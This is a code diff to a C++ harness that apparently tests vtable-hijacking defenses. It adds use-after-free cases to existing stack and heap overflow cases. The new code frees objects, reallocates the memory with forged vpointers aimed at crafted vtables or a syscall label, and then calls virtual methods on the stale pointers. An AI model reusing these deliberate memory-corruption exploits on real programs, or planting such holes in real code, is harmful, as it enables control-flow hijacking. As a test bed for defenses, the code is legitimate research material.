@@ -176,6 +176,172 @@ void doSyscall(int x, char* string) {
 }
 
 
+
+
+
+void doUAF (void* ptr, int debug, int size) {
+    void** newPtr = NULL;
+    switch (arg1)
+    {
+        case 0: {
+            if (debug)
+                cout << "UAF with valid inheritance" << endl;
+
+            newPtr = (void**) new SingleInherit2();
+
+            break;
+        }
+        case 1: {
+            if (debug) 
+                cout << "UAF middle of good inheritance" << endl;
+
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11 || arg2 == 13 || arg2 == 15)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+
+            break;
+        }
+        case 2: {
+            if (debug)
+                cout << "uaf with invalid inheritance" << endl;
+
+            newPtr = (void**) new ParentTwo();
+
+            break;
+        }
+        case 3: {
+            if (debug) 
+                cout << "uaf middle of invalid inheritance" << endl;
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+            break;
+        }
+        case 4: {
+            if (debug) 
+                cout << "uaf crafted vtable with valid inheritance" << endl;
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+            break;
+        }
+        case 5: {
+            if (debug) 
+                cout << "uaf crafted vtable with invalid inheritance" << endl;
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+            break;
+        }
+        case 6: {
+            if (debug) 
+                cout << "uaf nonClassFunc" << endl;
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+            break;
+        }
+        case 7: {
+            newPtr = (void**) malloc(size);
+
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+
+            if (debug) 
+            {
+                cout << "uaf middle of a nonClassFunc" << endl;
+                printf("location of syslbl/destination = %p\n", (void*)(*((void***)*newPtr)));
+            }
+            break;
+        }
+        case 8: {
+            if (debug) 
+                cout << "uaf start of a vtable of other parent in double inheritance" << endl;
+            newPtr = (void**) malloc(size);
+
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+            {
+                *newPtr = destination;
+                break;
+            }
+            
+            void* temp = (void*) new ParentFour();
+            memcpy((void*)(newPtr + 4), temp, size-4 > sizeof(ParentFour) ? sizeof(ParentFour) : size-4);
+            free (temp);
+
+            break;
+        }
+        case 9: {
+            if (debug) 
+                cout << "uaf middle of a vtable of other parent in double inheritance" << endl;
+            newPtr = (void**) malloc(size);
+
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+            break;
+        }
+        case 10: {
+            if (debug) 
+                cout << "uaf start of a vtable of third unrelated parent in double inheritance" << endl;
+
+            newPtr = (void**) malloc(size);
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+            {
+                *newPtr = destination;
+                break;
+            }
+            void* temp = (void*) new ParentFive();
+            memcpy((void*)(newPtr + 4), temp, size-4 > sizeof(ParentFive) ? sizeof(ParentFive) : size-4);
+            free (temp);
+
+            break;
+        }
+        case 11: {
+            if (debug) 
+                cout << "uaf middle of a vtable of third unrelated parent in double inheritance" << endl;
+            newPtr = (void**) malloc(size);
+
+            if (arg2 == 9 || arg2 == 11)  // double inherit overwrite 2nd vptr
+                newPtr[4] = destination;
+            else
+                *newPtr = destination;
+
+            break;
+        }
+            // if (arg2 == 9 || arg2 == 11 || arg2 == 13 || arg2 == 15)  // double inherit overwrite 2nd vptr
+            //     newPtr[4] = *newPtr;
+
+
+        default: {
+            cout << "bad first option\n";
+            exit(0);
+            break;
+        }
+    }
+
+
+    if (debug && newPtr!=ptr)
+    {
+        cout << "UAF new pointer not in the same location" << endl;
+        printf("Old = %p New = %p\n", ptr, newPtr);
+        exit(0);
+    }
+}
+
 int main(int argc, char const *argv[])
 {
     if (argc < 3)
@@ -189,9 +355,26 @@ int main(int argc, char const *argv[])
     {
         debug = 1;   
     }
+    if (argc == 5 && strcmp(argv[4], "d") == 0) 
+    {
+        debug = 1;   
+    }
+
+    int uaf = 0;
+    if (argc == 4 && strcmp(argv[3], "u") == 0) 
+    {
+        uaf = 1;   
+    }
+
+    if (argc == 5 && strcmp(argv[3], "u") == 0) 
+    {
+        uaf = 1;   
+    }
 
     arg1 = atoi(argv[1]);
     arg2 = atoi(argv[2]);
+
+
 // SET DESTINATIONS
     switch (atoi(argv[1])) {  //todo fix
 
@@ -208,6 +391,8 @@ int main(int argc, char const *argv[])
                 // delete object2;
                 // break;
             }
+
+            if (uaf) break; // if uaf enabled then we just create an object of that type
 
             if (debug)
             cout << "point to the start of a vtable with valid inheritance" << endl;
@@ -235,6 +420,9 @@ int main(int argc, char const *argv[])
                 // break;
             }
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the middle of a vtable with valid inheritance" << endl;
 
@@ -249,6 +437,9 @@ int main(int argc, char const *argv[])
 
         case 2:  // start of good vable point to bad inheritance func:
         {
+            if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the start of a vtable with invalid inheritance" << endl;
 
@@ -274,6 +465,9 @@ int main(int argc, char const *argv[])
         case 3:  // middle of good vable point to bad inheritance func:
         {
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the middle of a vtable with invalid inheritance" << endl;
 
@@ -298,6 +492,9 @@ int main(int argc, char const *argv[])
         case 4:  // crafted vable point to good inheritance func:
         {
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to a crafted vtable with valid inheritance" << endl;
 
@@ -337,6 +534,9 @@ int main(int argc, char const *argv[])
         case 5:  // crafted vable point to bad inheritance func:
         {
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to a crafted vtable with invalid inheritance" << endl;
 
@@ -378,6 +578,9 @@ int main(int argc, char const *argv[])
 
         case 6:  // crafted vable nonClassFunc:
         {
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to a nonClassFunc" << endl;
 
@@ -396,6 +599,9 @@ int main(int argc, char const *argv[])
 
         case 7:  // crafted vable middle of nonClassFunc:
         {
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the middle of a nonClassFunc" << endl;
 
@@ -404,7 +610,12 @@ int main(int argc, char const *argv[])
 
             for (int i = 0; i < 8; ++i)
             {
-                *(buffer+i) = &&syslbl;  // second function
+                *(buffer+i) = &&syslbl;
+            }
+
+            if (debug)
+            {
+                printf("location of syslbl = %p\n", &&syslbl);
             }
 
             destination = buffer;
@@ -420,6 +631,9 @@ int main(int argc, char const *argv[])
                 exit(0);            
             }
 
+            if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the start of a vtable of other parent in double inheritance" << endl;
 
@@ -439,6 +653,9 @@ int main(int argc, char const *argv[])
                 exit(0);            
             }
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the middle of a vtable of other parent in double inheritance" << endl;
 
@@ -459,6 +676,9 @@ int main(int argc, char const *argv[])
                 exit(0);            
             }
 
+            if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the start of a vtable of third unrelated parent in double inheritance" << endl;
 
@@ -478,6 +698,9 @@ int main(int argc, char const *argv[])
                 exit(0);            
             }
 
+            // if (uaf) break; // if uaf enabled then we just create an object of that type
+
+            
             if (debug)
             cout << "point to the middle of a vtable of third unrelated parent in double inheritance" << endl;
 
@@ -508,21 +731,28 @@ int main(int argc, char const *argv[])
             void* buffer[3];
 
             ParentOne* object = &singleObj;
-
-            if (((void*)object < (void*)buffer))
+            if (uaf)
             {
-                if (debug)
-                cout << "*****cant overflow...object before buffer" << endl;
-                if (debug)
-                printf("object = %p\tbuffer = %p\n", object, buffer);
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
                 exit(0);
             }
 
-            if (debug)
-                printf("object = %p\tbuffer = %p\n", object, buffer);
+            if (((void*)object < (void*)buffer))
+            {
+                if (debug) {
+                    cout << "*****cant overflow...object before buffer" << endl;
+                    printf("object = %p\tbuffer = %p\n", object, buffer);
+                }
+                exit(0);
+            }
 
-            if (debug)
+            if (debug) {
+                printf("object = %p\tbuffer = %p\n", object, buffer);
                 printf("old vpointer = %p\n", (void*)*(void**)object);
+            }
+
             // printf("address of buffer = %p \naddress of object = %p\n\n", &buffer[0], &singleObj);
             for (int i = 0; i<((uint64_t)object - (uint64_t)buffer); ++i)  // overflow
             {
@@ -538,7 +768,7 @@ int main(int argc, char const *argv[])
             }
 
             if(debug)
-            cout << "calling SingleInherit1::F1" << endl;
+                cout << "calling SingleInherit1::F1" << endl;
             object->doSomething1(attackString);
             break;
         }
@@ -553,6 +783,13 @@ int main(int argc, char const *argv[])
 // printf("%d\n", sizeof(SingleInherit1));
 // printf("%d\n", sizeof(void*));
             ParentOne* object = new SingleInherit1();
+
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(SingleInherit1));
+                goto attack1; 
+            }
 
             if (((void*)object < (void*)buffer))
             {
@@ -583,15 +820,25 @@ int main(int argc, char const *argv[])
             printf("vpointer to copy = %p\n", destination);
 
 
-            if(debug)
-            cout << "calling SingleInherit1::F1" << endl;
-            object->doSomething1(attackString);
+            attack1:    
+                if(debug)
+                    cout << "calling SingleInherit1::F1" << endl;
 
-            break;
+                object->doSomething1(attackString);
+
+                break;
         }
 
         case 2:  // stack+SingleInherit+indirectOverwrite:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+SingleInherit+indirectOverwrite\n";
             SingleInherit1 singleObj;
@@ -619,6 +866,13 @@ int main(int argc, char const *argv[])
             cout << "heap+SingleInherit+indirectOverwrite\n";
             ParentOne* object = new SingleInherit1();
 
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(SingleInherit1));
+                goto attack3; 
+            }
+
             if (debug)
             printf("old vpointer = %p\n", (void*)*(void**)object);
 
@@ -629,10 +883,11 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
             
-            if(debug)
-            cout << "calling SingleInherit1::F1" << endl;
-            object->doSomething1(attackString);
-            break;
+            attack3:
+                if(debug)
+                    cout << "calling SingleInherit1::F1" << endl;
+                object->doSomething1(attackString);
+                break;
         }
 
 
@@ -640,6 +895,14 @@ int main(int argc, char const *argv[])
 
         case 4:  //stack+SingleInherit+sequentialOverFlow:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+SingleInherit+sequentialOverFlow\n";
             SingleInherit1 singleObj;
@@ -683,6 +946,7 @@ int main(int argc, char const *argv[])
 
         case 5:  // heap+SingleInherit+sequentialOverFlow:
         {
+
             if (debug)
             cout << "heap+SingleInherit+sequentialOverFlow\n";
             // void** buffer = (void **)malloc(sizeof(void*)*3);
@@ -691,6 +955,13 @@ int main(int argc, char const *argv[])
 // printf("%d\n", sizeof(SingleInherit1));
 // printf("%d\n", sizeof(void*));
             SingleInherit1* object = new SingleInherit1();
+
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(SingleInherit1));
+                goto attack5; 
+            }
 
             if (((void*)object < (void*)buffer))
             {
@@ -720,16 +991,24 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
 
+            attack5:
+                if(debug)
+                cout << "calling SingleInherit1::F1" << endl;
+                object->doSomething1(attackString);
 
-            if(debug)
-            cout << "calling SingleInherit1::F1" << endl;
-            object->doSomething1(attackString);
-
-            break;
+                break;
         }
 
         case 6:  // stack+SingleInherit+indirectOverwrite:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+SingleInherit+indirectOverwrite\n";
             SingleInherit1 singleObj;
@@ -757,6 +1036,13 @@ int main(int argc, char const *argv[])
             cout << "heap+SingleInherit+indirectOverwrite\n";
             SingleInherit1* object = new SingleInherit1();
 
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(SingleInherit1));
+                goto attack7; 
+            }
+
             if (debug)
             printf("old vpointer = %p\n", (void*)*(void**)object);
 
@@ -767,15 +1053,24 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
             
-            if(debug)
-            cout << "calling SingleInherit1::F1" << endl;
-            object->doSomething1(attackString);
-            break;
+            attack7:
+                if(debug)
+                cout << "calling SingleInherit1::F1" << endl;
+                object->doSomething1(attackString);
+                break;
         }
 
 //////////////////////////double
         case 8:  // stack+DoubleInherit+withinObjectOverFlow:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+DoubleInherit+withinObjectOverFlow\n";
             DoubleInheritChild1 doubleObj;
@@ -804,8 +1099,16 @@ int main(int argc, char const *argv[])
         case 9:  // heap+DoubleInherit+withinObjectOverFlow:
         {
             if (debug)
-            cout << "heap+DoubleInherit+withinObjectOverFlow\n";
+                cout << "heap+DoubleInherit+withinObjectOverFlow\n";
+
             DoubleInheritChild1* object = new DoubleInheritChild1();
+
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(DoubleInheritChild1));
+                goto attack9; 
+            }
 
             if (debug)
             printf("old vpointer = %p\n", (void*)*((void**)object + 4));
@@ -820,14 +1123,23 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
 
-            if(debug)
-            cout << "calling DoubleInheritChild1::F3 ParentFour::F1" << endl;
-            object->ParentFourfoo1(attackString);
-            break;
+            attack9:
+                if(debug)
+                cout << "calling DoubleInheritChild1::F3 ParentFour::F1" << endl;
+                object->ParentFourfoo1(attackString);
+                break;
         }
 
         case 10:  // stack+DoubleInherit+INdirectOverwrite:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+DoubleInherit+INdirectOverwrite\n";
             DoubleInheritChild1 doubleObj;
@@ -854,8 +1166,16 @@ int main(int argc, char const *argv[])
         {
 
             if (debug)
-            cout << "heap+DoubleInherit+INdirectOverwrite\n";
+                cout << "heap+DoubleInherit+INdirectOverwrite\n";
+
             DoubleInheritChild1* object = new DoubleInheritChild1();
+
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(DoubleInheritChild1));
+                goto attack11; 
+            }
 
             if (debug)
             printf("old vpointer = %p\n", (void*)*((void**)object + 4));
@@ -867,15 +1187,24 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
 
-            if(debug)
-            cout << "calling DoubleInheritChild1::F3 ParentFour::F1" << endl;
-            object->ParentFourfoo1(attackString);
-            break;
+            attack11:
+                if(debug)
+                    cout << "calling DoubleInheritChild1::F3 ParentFour::F1" << endl;
+                object->ParentFourfoo1(attackString);
+                break;
         }
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
         case 12:  //stack+DoubleInheritChild+sequentialOverFlow:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+DoubleInheritChild+sequentialOverFlow\n";
             ParentThree singleObj;
@@ -926,6 +1255,13 @@ int main(int argc, char const *argv[])
 
             ParentThree* object = new ParentThree();
 
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(ParentThree));
+                goto attack13; 
+            }
+
             if (((void*)object < (void*)buffer))
             {
                 if (debug)
@@ -955,15 +1291,24 @@ int main(int argc, char const *argv[])
             printf("vpointer to copy = %p\n", destination);
 
 
-            if(debug)
-            cout << "calling ParentThree::F1" << endl;
-            object->foo1(attackString);
+            attack13:
+                if(debug)
+                    cout << "calling ParentThree::F1" << endl;
+                object->foo1(attackString);
 
-            break;
+                break;
         }
 
         case 14:  // stack+DoubleInheritChild+indirectOverwrite:
         {
+            if (uaf)
+            {
+                if (debug) {
+                    cout << "no UAF on stack" << endl;
+                }
+                exit(0);
+            }
+
             if (debug)
             cout << "stack+DoubleInheritChild+indirectOverwrite\n";
             ParentThree singleObj;
@@ -988,8 +1333,16 @@ int main(int argc, char const *argv[])
         case 15:  // heap+DoubleInheritChild+indirectOverwrite:
         {
             if (debug)
-            cout << "heap+DoubleInheritChild+indirectOverwrite\n";
+                cout << "heap+DoubleInheritChild+indirectOverwrite\n";
+
             ParentThree* object = new ParentThree();
+
+            if (uaf)
+            {
+                delete object;
+                doUAF(object, debug, sizeof(ParentThree));
+                goto attack15; 
+            }
 
             if (debug)
             printf("old vpointer = %p\n", (void*)*(void**)object);
@@ -1001,13 +1354,15 @@ int main(int argc, char const *argv[])
             if (debug)
             printf("vpointer to copy = %p\n", destination);
             
-            if(debug)
-            cout << "calling ParentThree::F1" << endl;
-            object->foo1(attackString);
-            break;
+            attack15:
+                if(debug)
+                    cout << "calling ParentThree::F1" << endl;
+
+                object->foo1(attackString);
+                break;
         }
 
-        case 50: goto syslbl;
+        case 50: goto syslbl;  // just so that compiler does not remove it
 
         default: {
             cout << "bad second option\n";
